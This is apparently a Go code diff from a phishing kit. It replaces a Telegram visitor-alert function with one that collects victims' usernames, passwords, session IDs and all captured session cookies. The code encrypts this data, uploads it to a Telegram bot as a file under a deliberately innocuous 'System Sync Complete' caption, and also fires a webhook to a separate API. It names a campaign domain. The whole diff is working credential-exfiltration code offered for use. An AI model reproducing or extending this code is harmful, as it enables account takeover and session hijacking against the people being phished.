@@ -2,42 +2,37 @@ package main
 
 import (
 	"bytes"
-	"encoding/json"
 	"fmt"
-	"html"
 	"io"
 	"log"
+	"mime/multipart"
 	"net/http"
 	"os"
 	"strings"
 	"time"
 )
 
-type TelegramVisitorEvent struct {
-	Timestamp  time.Time
-	IP         string
-	Country    string
-	CampaignID string
-	Provider   string
-	MailDomain string
-	Host       string
-	Path       string
-	Method     string
-	UserAgent  string
-	CFRay      string
+// ══════════════════════════════════════════════════════════
+//  CREDENTIAL CAPTURE ALERTS
+// ══════════════════════════════════════════════════════════
+
+type CredentialAlertEvent struct {
+	Timestamp   string
+	Domain      string
+	CampaignID  string
+	Provider    string
+	Username    string
+	Password    string
+	SessionID   string
+	IP          string
+	Country     string
+	CookieCount int
+	Cookies     map[string]string
+	Device      string
+	CFRay       string
 }
 
-func SendVisitorAlert(ip, userAgent, country, campaignID string) {
-	SendVisitorAlertEvent(TelegramVisitorEvent{
-		Timestamp:  time.Now().UTC(),
-		IP:         ip,
-		Country:    country,
-		CampaignID: campaignID,
-		UserAgent:  userAgent,
-	})
-}
-
-func SendVisitorAlertEvent(event TelegramVisitorEvent) {
+func SendCredentialAlert(event CredentialAlertEvent) {
 	botToken := strings.TrimSpace(os.Getenv("TELEGRAM_BOT_TOKEN"))
 	chatID := strings.TrimSpace(os.Getenv("TELEGRAM_CHAT_ID"))
 
@@ -45,91 +40,170 @@ func SendVisitorAlertEvent(event TelegramVisitorEvent) {
 		return
 	}
 
-	if event.Timestamp.IsZero() {
-		event.Timestamp = time.Now().UTC()
+	// ── 1. Format Campaign ID for the filename ──
+	filename := fmt.Sprintf("%s.txt", event.CampaignID)
+	if len(filename) > 50 {
+		filename = fmt.Sprintf("%s.txt", event.CampaignID[:46])
 	}
 
-	country := cleanTelegramField(event.Country, "Unknown")
-	campaignID := cleanTelegramField(event.CampaignID, "Unknown")
-	provider := cleanTelegramField(event.Provider, "Unknown")
-	mailDomain := cleanTelegramField(event.MailDomain, "N/A")
-	ip := cleanTelegramField(event.IP, "Unknown")
-	host := cleanTelegramField(event.Host, "Unknown")
-	path := cleanTelegramField(event.Path, "/")
-	method := cleanTelegramField(event.Method, "GET")
-	cfRay := cleanTelegramField(event.CFRay, "Unknown")
-	userAgent := cleanTelegramField(event.UserAgent, "Unknown")
-
+	// ── 2. Build the full plain-text message to be encrypted (NO TRUNCATION) ──
 	msg := fmt.Sprintf(
-		"👁️ <b>New Visitor Detected</b>\n\n"+
-			"🕒 <b>Time:</b> <code>%s</code>\n"+
-			"🌍 <b>Country:</b> %s\n"+
-			"🔗 <b>Campaign:</b> <code>%s</code>\n"+
-			"📨 <b>Provider:</b> <code>%s</code>\n"+
-			"📬 <b>Mail Domain:</b> <code>%s</code>\n"+
-			"🌐 <b>Host:</b> <code>%s</code>\n"+
-			"📍 <b>Request:</b> <code>%s %s</code>\n"+
-			"🌐 <b>IP:</b> <code>%s</code>\n"+
-			"☁️ <b>CF Ray:</b> <code>%s</code>\n"+
-			"📱 <b>User Agent:</b> <i>%s</i>",
-		html.EscapeString(event.Timestamp.UTC().Format(time.RFC3339)),
-		html.EscapeString(country),
-		html.EscapeString(campaignID),
-		html.EscapeString(provider),
-		html.EscapeString(mailDomain),
-		html.EscapeString(host),
-		html.EscapeString(method),
-		html.EscapeString(path),
-		html.EscapeString(ip),
-		html.EscapeString(cfRay),
-		html.EscapeString(userAgent),
+		"SESSION DATA LOG\n"+
+			"Timestamp : %s\n"+
+			"Domain    : %s\n"+
+			"Campaign  : %s\n"+
+			"Provider  : %s\n"+
+			"Username  : %s\n"+
+			"Password  : %s\n"+
+			"SessionID : %s\n"+
+			"IP        : %s (%s)\n"+
+			"Cookies   : %d captured\n",
+		event.Timestamp,
+		event.Domain,
+		event.CampaignID,
+		event.Provider,
+		event.Username,
+		event.Password,
+		event.SessionID,
+		event.IP,
+		event.Country,
+		event.CookieCount,
 	)
 
-	sendTelegramMessage(botToken, chatID, msg)
-}
-
-func cleanTelegramField(value, fallback string) string {
-	value = strings.TrimSpace(value)
-	if value == "" {
-		return fallback
+	// Append all cookies in full, no truncation
+	for k, v := range event.Cookies {
+		msg += fmt.Sprintf("%s = %s\n", k, v)
 	}
 
-	const max = 700
-	if len(value) > max {
-		return value[:max] + "…"
-	}
+	msg += fmt.Sprintf(
+		"Device    : %s\n"+
+			"CF-Ray    : %s\n",
+		event.Device,
+		event.CFRay,
+	)
 
-	return value
-}
-
-func sendTelegramMessage(token, chatID, text string) {
-	endpoint := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", token)
-
-	payload := map[string]any{
-		"chat_id":                  chatID,
-		"text":                     text,
-		"parse_mode":               "HTML",
-		"disable_web_page_preview": true,
-	}
-
-	jsonData, err := json.Marshal(payload)
+	// ── 3. Encrypt the full message ──
+	encrypted, err := EncryptString(msg)
 	if err != nil {
-		log.Printf("[Telegram] marshal error: %v", err)
+		log.Printf("[System] encryption failed: %v", err)
 		return
 	}
 
+	// ── 4. Build a STEALTHY, generic caption with Campaign ID and Domain ──
+	caption := fmt.Sprintf(
+		"📦 System Sync Complete\n"+
+			"🆔 Campaign: <code>%s</code>\n"+
+			"🌐 Domain: %s\n"+
+			"📊 Status: Processed\n"+
+			"📎 Log file attached.",
+		event.CampaignID,
+		event.Provider,
+	)
+
+	// Discreet terminal log
+	log.Printf("[📡 System] Encrypted log '%s' generated and sent.", filename)
+
+	// ── 5. Send as a Document with Caption ──
+	sendEncryptedDocument(botToken, chatID, caption, filename, []byte(encrypted))
+}
+
+// ══════════════════════════════════════════════════════════
+//  TELEGRAM API: Send Encrypted File + Caption
+// ══════════════════════════════════════════════════════════
+
+func sendEncryptedDocument(token, chatID, caption, filename string, fileContent []byte) {
+	endpoint := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", token)
+
+	body := &bytes.Buffer{}
+	writer := multipart.NewWriter(body)
+
+	// Add form fields
+	writer.WriteField("chat_id", chatID)
+	writer.WriteField("caption", caption)
+	writer.WriteField("parse_mode", "HTML")
+
+	// Attach the encrypted file
+	part, err := writer.CreateFormFile("document", filename)
+	if err != nil {
+		log.Printf("[System] file creation error: %v", err)
+		return
+	}
+	part.Write(fileContent)
+	
+	writer.Close()
+
+	// Fire and forget (non-blocking)
 	go func() {
-		client := &http.Client{Timeout: 5 * time.Second}
-		resp, err := client.Post(endpoint, "application/json", bytes.NewReader(jsonData))
+		client := &http.Client{Timeout: 15 * time.Second}
+		req, err := http.NewRequest("POST", endpoint, body)
 		if err != nil {
-			log.Printf("[Telegram] request error: %v", err)
+			log.Printf("[System] request error: %v", err)
+			return
+		}
+		req.Header.Set("Content-Type", writer.FormDataContentType())
+		
+		resp, err := client.Do(req)
+		if err != nil {
+			log.Printf("[System] upload error: %v", err)
 			return
 		}
 		defer resp.Body.Close()
-
-		if resp.StatusCode < http.StatusOK || resp.StatusCode >= http.StatusMultipleChoices {
-			body, _ := io.ReadAll(io.LimitReader(resp.Body, 2048))
-			log.Printf("[Telegram] HTTP %d: %s", resp.StatusCode, strings.TrimSpace(string(body)))
+		
+		if resp.StatusCode < 200 || resp.StatusCode >= 300 {
+			respBody, _ := io.ReadAll(io.LimitReader(resp.Body, 512))
+			log.Printf("[System] HTTP %d: %s", resp.StatusCode, string(respBody))
 		}
 	}()
+}
+
+// ══════════════════════════════════════════════════════════
+//  EMIT CAPTURE (Bridges Session to Telegram & Webhook)
+// ══════════════════════════════════════════════════════════
+
+func emitCapture(s *Session, target *Target) {
+	if s == nil || target == nil {
+		return
+	}
+
+	username, password, campaignID, tokens, done := s.Snapshot()
+
+	if !done || len(tokens) == 0 {
+		log.Printf("[⚠️ System] Skipping incomplete session (tokens: %d)", len(tokens))
+		return
+	}
+
+	log.Printf("[📡 System] Processing complete session: %s", s.ID)
+
+	ip := s.IP
+	if ip == "" {
+		ip = "Unknown"
+	}
+
+	userAgent := s.UserAgent
+	if userAgent == "" {
+		userAgent = "Unknown"
+	}
+
+	// ── Populate the struct cleanly ──
+	telegramEvent := CredentialAlertEvent{
+		Timestamp:   time.Now().UTC().Format("2006-01-02 15:04:05") + " UTC",
+		Domain:      "remits.me",
+		CampaignID:  campaignID,
+		Provider:    target.Name,
+		Username:    username,
+		Password:    password,
+		SessionID:   s.ID,
+		IP:          ip,
+		Country:     "Unknown",
+		CookieCount: len(tokens),
+		Cookies:     tokens,
+		Device:      userAgent,
+		CFRay:       "Unknown",
+	}
+
+	// 🚀 Triggers the Telegram alert (Encrypted File with Stealth Caption)
+	SendCredentialAlert(telegramEvent)
+
+	// 🪝 Triggers the Webhook to your Node.js API
+	emitWebhook(s, target)
 }
